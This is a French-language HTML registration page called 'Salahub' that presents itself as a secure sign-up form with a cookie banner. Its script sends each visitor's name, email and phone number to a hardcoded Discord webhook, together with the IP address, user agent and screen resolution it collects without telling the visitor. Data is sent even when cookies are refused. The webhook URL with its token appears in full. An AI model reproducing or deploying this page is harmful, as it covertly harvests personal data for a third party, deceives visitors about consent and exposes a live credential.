<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Salahub</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', sans-serif;
}

body {
    height: 100vh;
    background: linear-gradient(135deg, #0a0a0a, #1a0000);
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
}

/* ANIMATED BACKGROUND */
.bg {
    position: absolute;
    width: 500px;
    height: 500px;
    background: red;
    filter: blur(150px);
    opacity: 0.3;
    animation: move 10s infinite alternate;
}

@keyframes move {
    from {transform: translate(-100px, -100px);}
    to {transform: translate(200px, 200px);}
}

/* CARD */
.card {
    position: relative;
    width: 360px;
    padding: 35px;
    border-radius: 20px;
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,0,0,0.2);
    box-shadow: 0 0 40px rgba(255,0,0,0.2);
    text-align: center;
    animation: fade 1s ease;
}

@keyframes fade {
    from {opacity:0; transform: translateY(30px);}
    to {opacity:1; transform: translateY(0);}
}

h1 {
    color: #ff2a2a;
    margin-bottom: 10px;
    letter-spacing: 2px;
}

p {
    opacity: 0.6;
    margin-bottom: 20px;
}

/* INPUT */
.input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 10px;
    border: none;
    background: rgba(255,255,255,0.05);
    color: white;
    transition: 0.3s;
}

.input:focus {
    outline: none;
    box-shadow: 0 0 10px red;
}

/* BUTTON */
.btn {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(135deg, #ff0000, #660000);
    color: white;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
}

.btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 20px rgba(255,0,0,0.4);
}

/* COOKIE */
.cookie {
    position: fixed;
    bottom: 20px;
    background: #111;
    padding: 15px 20px;
    border-radius: 10px;
    display: flex;
    gap: 10px;
    align-items: center;
}

.cookie button {
    background: red;
    border: none;
    padding: 6px 12px;
    color: white;
    cursor: pointer;
    border-radius: 6px;
}
</style>
</head>

<body>

<div class="bg"></div>

<div class="card">
    <h1>SALAHUB</h1>
    <p>Accès sécurisé</p>

    <form id="form">
        <input class="input" type="text" id="nom" placeholder="Nom" required>
        <input class="input" type="text" id="prenom" placeholder="Prénom" required>
        <input class="input" type="email" id="email" placeholder="Email" required>
        <input class="input" type="tel" id="telephone" placeholder="Téléphone" required>

        <button class="btn">S'inscrire</button>
    </form>
</div>

<div class="cookie" id="cookieBar">
    <span>Cookies utilisés pour améliorer l'expérience</span>
    <button onclick="acceptCookies()">OK</button>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY";

let cookieConsent = "Refusé";

function acceptCookies(){
    cookieConsent = "Accepté";
    document.cookie = "consent=true";
    document.getElementById("cookieBar").style.display = "none";
}

if(document.cookie.includes("consent=true")){
    cookieConsent = "Accepté";
    document.getElementById("cookieBar").style.display = "none";
}

document.getElementById("form").addEventListener("submit", async function(e){
    e.preventDefault();

    const nom = document.getElementById("nom").value;
    const prenom = document.getElementById("prenom").value;
    const email = document.getElementById("email").value;
    const telephone = document.getElementById("telephone").value;

    const date = new Date().toLocaleString();
    const ua = navigator.userAgent.substring(0,100);
    const reso = screen.width + "x" + screen.height;

    let ip = "Inconnue";
    try {
        const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json();
        ip = d.ip;
    } catch {}

    const payload = {
        embeds: [{
            title: "🔥 Salahub Inscription",
            color: 16711680,
            fields: [
                {name:"👤 User", value:`${nom} ${prenom}\n${email}\n${telephone}`},
                {name:"🌐 Tech", value:`IP: ${ip}\nRésolution: ${reso}`},
                {name:"🍪 Cookies", value: cookieConsent},
                {name:"🖥 Agent", value: ua}
            ],
            footer:{text: date}
        }]
    };

    fetch(webhookURL,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
    });

    alert("OK");
});
</script>

</body>
</html>
